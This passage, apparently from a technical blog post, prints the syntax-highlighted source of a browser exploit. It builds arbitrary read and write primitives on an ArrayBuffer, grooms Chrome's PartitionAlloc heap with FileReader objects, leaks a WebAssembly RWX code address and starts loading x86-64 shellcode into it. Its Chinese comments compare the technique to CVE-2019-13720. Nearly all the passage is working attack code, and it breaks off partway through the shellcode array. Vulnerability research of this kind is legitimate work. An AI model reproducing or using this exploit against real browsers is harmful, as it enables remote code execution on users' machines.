				<span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">utof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">low32</span><span class="p">(</span><span class="nx">addr</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
				<span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nx">utof</span><span class="p">((</span><span class="nx">ftou</span><span class="p">(</span><span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">&amp;</span>
								   <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xFFFFFFFF00000000</span><span class="p">))</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">high32</span><span class="p">(</span><span class="nx">addr</span><span class="p">)));</span>
				<span class="k">return</span> <span class="k">new</span> <span class="nx">BigInt64Array</span><span class="p">(</span><span class="nx">arrbuf</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
			<span class="p">}</span>
			
			<span class="kd">function</span> <span class="nx">writeN</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">src</span><span class="p">)</span> <span class="p">{</span>
				<span class="c1">// modify backing_store</span>
				<span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">utof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">low32</span><span class="p">(</span><span class="nx">addr</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
				<span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nx">utof</span><span class="p">(</span>
							<span class="p">(</span><span class="nx">ftou</span><span class="p">(</span><span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">&amp;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xFFFFFFFF00000000</span><span class="p">))</span> <span class="o">+</span>
							<span class="nx">BigInt</span><span class="p">(</span><span class="nx">high32</span><span class="p">(</span><span class="nx">addr</span><span class="p">)));</span>
					<span class="c1">// modify len</span>
				<span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span>
					  <span class="nx">utof</span><span class="p">(</span><span class="nx">ftou</span><span class="p">(</span><span class="nx">arrbuf_as_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">src</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">32</span><span class="p">)));</span>
				
				<span class="kd">let</span> <span class="nx">dst</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">arrbuf</span><span class="p">);</span>
				<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">src</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">dst</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">src</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
				<span class="p">}</span>
			<span class="p">}</span>
			
			<span class="k">await</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">read64</span><span class="p">,</span> <span class="nx">writeN</span><span class="p">,</span> <span class="nx">backing_store</span><span class="p">);</span>
		<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">alert</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">e</span><span class="p">.</span><span class="nx">lineNumber</span><span class="p">}</span><span class="s2">:</span><span class="p">${</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">read64</span><span class="p">,</span> <span class="nx">writeN</span><span class="p">,</span> <span class="nx">leaked_arrbuf_ptr</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span>
	<span class="mi">0</span><span class="p">,</span>   <span class="mi">97</span><span class="p">,</span>  <span class="mi">115</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">1</span><span class="p">,</span>   <span class="mi">133</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
	<span class="mi">1</span><span class="p">,</span>   <span class="mi">96</span><span class="p">,</span>  <span class="mi">0</span><span class="p">,</span>   <span class="mi">1</span><span class="p">,</span>   <span class="mi">127</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span>   <span class="mi">130</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>   <span class="mi">1</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">4</span><span class="p">,</span>
	<span class="mi">132</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>   <span class="mi">1</span><span class="p">,</span>   <span class="mi">112</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">5</span><span class="p">,</span>   <span class="mi">131</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span>
	<span class="mi">0</span><span class="p">,</span>   <span class="mi">1</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">1</span><span class="p">,</span>   <span class="mi">6</span><span class="p">,</span>   <span class="mi">129</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">7</span><span class="p">,</span>   <span class="mi">145</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span>
	<span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>   <span class="mi">2</span><span class="p">,</span>   <span class="mi">6</span><span class="p">,</span>   <span class="mi">109</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">4</span><span class="p">,</span>
	<span class="mi">109</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span>  <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">10</span><span class="p">,</span>  <span class="mi">138</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>   <span class="mi">1</span><span class="p">,</span>   <span class="mi">132</span><span class="p">,</span>
	<span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>   <span class="mi">0</span><span class="p">,</span>   <span class="mi">65</span><span class="p">,</span>  <span class="mi">42</span><span class="p">,</span>  <span class="mi">11</span>
	<span class="p">]);</span>
	
	<span class="kd">const</span> <span class="nx">wasmBlob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span> <span class="nx">wasmCode</span> <span class="p">],</span> <span class="p">{</span><span class="na">type</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">application/wasm</span><span class="dl">"</span><span class="p">});</span>
	
	<span class="kd">let</span> <span class="nx">module</span> <span class="o">=</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">compile</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">)</span>
	<span class="c1">// let inst = WebAssembly.instantiate(module)</span>
	
	<span class="kd">const</span> <span class="nx">wasmUrl</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="nx">wasmBlob</span><span class="p">);</span>
	
	<span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">instantiateStreaming</span><span class="p">(</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">wasmUrl</span><span class="p">),</span> <span class="p">{})</span>
	<span class="kd">let</span> <span class="nx">wasmFuncA</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
	
	<span class="kd">function</span> <span class="nx">getArrBufBucket</span><span class="p">(</span><span class="nx">read64</span><span class="p">,</span> <span class="nx">slot</span><span class="p">)</span> <span class="p">{</span>
		<span class="kd">let</span> <span class="nx">meta</span> <span class="o">=</span> <span class="nx">getPartitionPageMetadataArea</span><span class="p">(</span><span class="nx">leaked_arrbuf_ptr</span><span class="p">);</span>
			<span class="kd">const</span> <span class="nx">offsetBucket</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
			<span class="kd">let</span> <span class="nx">bucket_0x10</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">meta</span> <span class="o">+</span> <span class="nx">offsetBucket</span><span class="p">);</span>
			<span class="k">return</span> <span class="nx">bucket_0x10</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="kd">function</span> <span class="nx">getFastMallocBucket</span><span class="p">(</span><span class="nx">ArrBufBucket</span><span class="p">)</span> <span class="p">{</span>
		<span class="kd">const</span> <span class="nx">bucket_delta</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xb40</span><span class="p">);</span>
		<span class="k">return</span> <span class="nx">ArrBufBucket</span> <span class="o">-</span> <span class="nx">bucket_delta</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="nx">fastMallocBucket</span> <span class="o">=</span> <span class="nx">getFastMallocBucket</span><span class="p">(</span>
		<span class="nx">getArrBufBucket</span><span class="p">(</span><span class="nx">read64</span><span class="p">,</span> <span class="nx">leaked_arrbuf_ptr</span><span class="p">));</span>
	
	<span class="nx">reader_arr</span> <span class="o">=</span> <span class="p">[];</span>
	
	<span class="kd">let</span> <span class="nx">fileReaderLoaderSize</span> <span class="o">=</span> <span class="mh">0x140</span><span class="p">;</span>
	
	<span class="kd">let</span> <span class="nx">bucket_0x140</span> <span class="o">=</span> <span class="nx">getFastMallocBucketBySlotSize</span><span class="p">(</span><span class="nx">read64</span><span class="p">,</span> <span class="nx">fastMallocBucket</span><span class="p">,</span>
		<span class="nx">fileReaderLoaderSize</span><span class="p">);</span>
	
	<span class="kd">const</span> <span class="nx">offsetActivePage</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	
	<span class="kd">let</span> <span class="nx">getActivePage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">bucket</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">bucket</span> <span class="o">+</span> <span class="nx">offsetActivePage</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">getFreeListHead</span> <span class="o">=</span> <span class="p">(</span><span class="nx">bucket</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">getActivePage</span><span class="p">(</span><span class="nx">bucket</span><span class="p">));</span>
	

	<span class="c1">// 因为 PartitionAlloc 又增加了一个 ThreadCache 缓存</span>
	<span class="c1">// 所以这部分读取 FileReaderLoader 地址的代码，和 CVE-2019-13720 相比有一些区别</span>
	
	<span class="kd">let</span> <span class="nx">cur</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	
	<span class="kd">function</span> <span class="nx">ConsumeSlot</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">reader_arr</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">FileReader</span><span class="p">);</span>
		<span class="nx">reader_arr</span><span class="p">[</span><span class="nx">reader_arr</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">].</span><span class="nx">readAsArrayBuffer</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([]));</span>
		<span class="nx">cur</span> <span class="o">=</span> <span class="nx">getFreeListHead</span><span class="p">(</span><span class="nx">bucket_0x140</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="c1">// 从 FastMallocPartition 读取 0x140 空闲内存链表头 </span>
	<span class="c1">// 循环是为了确保读到非 0 的链表头，实际作用未验证，也可以去掉</span>
	<span class="kd">let</span> <span class="nx">next_slot</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="k">while</span> <span class="p">(</span><span class="nx">next_slot</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">ConsumeSlot</span><span class="p">();</span>
		<span class="nx">next_slot</span> <span class="o">=</span> <span class="nx">cur</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="c1">// 消耗光 0x140 的 ThreadCache </span>
	<span class="c1">// ThreadCache 消耗光后，就会去 PartitionRoot 申请新内存，PartitionRoot 的链表头</span>
	<span class="c1">// 就会发生变化</span>
	<span class="k">while</span> <span class="p">(</span><span class="nx">cur</span> <span class="o">==</span> <span class="nx">next_slot</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">ConsumeSlot</span><span class="p">();</span>
	<span class="p">}</span>

	<span class="c1">// 再次消耗光 ThreadCache</span>
	<span class="c1">// 确保之前被分配给 ThreadCache 的内存块，已经被分配到 FileReaderLoader </span>
	<span class="c1">// allocate FileReaderLoader until cache is refilled</span>
	<span class="kd">let</span> <span class="nx">prev</span> <span class="o">=</span> <span class="nx">cur</span><span class="p">;</span>
	<span class="k">while</span> <span class="p">(</span><span class="nx">cur</span> <span class="o">==</span> <span class="nx">prev</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">ConsumeSlot</span><span class="p">();</span>
	<span class="p">}</span>
	
	<span class="kd">let</span> <span class="nx">fileReaderLoaderPtr</span> <span class="o">=</span> <span class="nx">next_slot</span><span class="p">;</span>
	
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">reader_arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">reader_arr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">onerror</span> <span class="o">=</span> <span class="nx">wasmFuncA</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="c1">// alert(`predicted FileReaderLoader: (0x${next_slot.toString(16)})`);</span>
	
	<span class="nx">alert</span><span class="p">(</span><span class="nx">reader_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">onerror</span><span class="p">);</span>
	<span class="kd">const</span> <span class="nx">fileReaderLoader_client</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
	
	<span class="kd">let</span> <span class="nx">fileReaderPtr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span>
		<span class="nx">fileReaderLoaderPtr</span> <span class="o">+</span> <span class="nx">fileReaderLoader_client</span><span class="p">)</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
	
	<span class="kd">const</span> <span class="nx">entries_1_eventListenerVec</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">vectorPtr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">fileReaderPtr</span> <span class="o">+</span> <span class="nx">entries_1_eventListenerVec</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">registeredEventListenerPtr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">vectorPtr</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">eventListenerPtr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">registeredEventListenerPtr</span><span class="p">);</span>
	<span class="kd">let</span> <span class="nx">eventHandlerPtr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">eventListenerPtr</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x28</span><span class="p">));</span>
	<span class="kd">let</span> <span class="nx">jsFunctionObjReferencePtr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">eventHandlerPtr</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x8</span><span class="p">));</span>
	
	<span class="kd">let</span> <span class="nx">jsFunctionPtr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">jsFunctionObjReferencePtr</span><span class="p">)</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	
	<span class="c1">// alert(`jsFuntionPtr 0x${jsFunctionPtr.toString(16)}`);</span>
	
	<span class="kd">let</span> <span class="nx">base</span> <span class="o">=</span> <span class="nx">jsFunctionPtr</span> <span class="o">&amp;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xFFFFFFFF00000000</span><span class="p">);</span>
	
	<span class="kd">let</span> <span class="nx">sharedFuncInfoPtr</span> <span class="o">=</span>
		<span class="nx">base</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">low32</span><span class="p">(</span><span class="nx">read64</span><span class="p">(</span><span class="nx">jsFunctionPtr</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x0C</span><span class="p">))))</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="c1">// alert(`sharedFuncInfoPtr 0x${sharedFuncInfoPtr.toString(16)}`);</span>
	
	<span class="kd">let</span> <span class="nx">wasmExportedFunctionDataPtr</span> <span class="o">=</span>
	<span class="nx">base</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">low32</span><span class="p">(</span><span class="nx">read64</span><span class="p">(</span><span class="nx">sharedFuncInfoPtr</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x4</span><span class="p">))))</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="c1">// alert(`wasmExported 0x${wasmExportedFunctionDataPtr.toString(16)}`);</span>
	
	<span class="kd">let</span> <span class="nx">rwx_addr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">wasmExportedFunctionDataPtr</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x4</span><span class="p">));</span>
	
	<span class="nx">alert</span><span class="p">(</span><span class="s2">`RWX addr: (0x</span><span class="p">${</span><span class="nx">rwx_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">)`</span><span class="p">);</span>
	
	<span class="kd">let</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span>
	<span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
	<span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span>
	<span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span>
	<span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span>
	<span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
	<span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span>
	<span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span>
	<span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span>
	<span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
	<span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span>
	<span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span>
	<span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span>
	<span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span>
	<span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span>
	<span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span>
